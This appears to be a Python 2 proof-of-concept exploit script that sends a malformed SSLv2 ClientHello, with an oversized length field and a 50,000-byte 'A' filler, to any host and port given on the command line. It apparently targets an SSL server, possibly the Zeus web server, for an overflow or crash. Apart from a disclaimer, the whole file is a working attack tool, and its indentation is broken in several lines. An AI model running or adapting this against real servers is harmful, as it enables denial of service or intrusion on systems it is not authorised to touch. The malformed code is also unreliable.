#!/usr/bin/env python
# zeus_ssl2.py
#
# Use this code at your own risk. Never run it against a production system.
# 
# THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
# WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
# ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
# ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
# OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.

import socket
import sys
import struct

def send_req(host,port):
        buf=""
        buf+=chr(1)
        buf+="\x00\x02" 
        buf+=struct.pack(">H",21)
        buf+=struct.pack(">H",0xffff)                                
        buf+=struct.pack(">H",16)
        buf+="\x07\x00\xc0\x03\x00\x80\x01\x00\x80\x08\x00\x80"
       buf+="\x06\x00\x40\x04\x00\x80\x02\x00\x80"
        buf+="A"* 50000  
        buf+="C"*16

        siz =  chr( ( (len(buf) & 0xff00) >> 8)| 0x80) + chr(len(buf)&0xff)
        buf = siz + buf

 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.connect((host,port))
 sock.sendall(buf)
 sock.recv(1000)
 sock.close()

if __name__=="__main__":
 if len(sys.argv)<3:
  print "usage: %s host port" % sys.argv[0]
  sys.exit()

 send_req(sys.argv[1],int(sys.argv[2]))
